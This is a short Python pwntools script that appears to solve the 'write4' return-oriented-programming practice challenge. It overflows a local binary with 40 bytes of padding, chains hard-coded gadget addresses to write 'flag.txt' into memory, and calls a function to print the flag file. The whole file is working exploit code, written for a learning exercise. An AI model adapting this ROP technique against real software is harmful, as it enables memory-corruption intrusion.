#!/bin/python3

from pwn import *

programm = "./write4"

p = process(programm)
p.recvuntil(">")

gadget = p64(0x00400690)
pop_rdi = p64(0x00400693)
mov_gadget = p64(0x00400628)
write_section = p64(0x00601038)
func = p64(0x00400510)

payload = b""
payload += b"A" * 40 # padding
payload += gadget
payload += write_section
payload += b"flag.txt"
payload += mov_gadget
payload += pop_rdi
payload += write_section
payload += func

p.sendline(payload)

print(p.recvall())
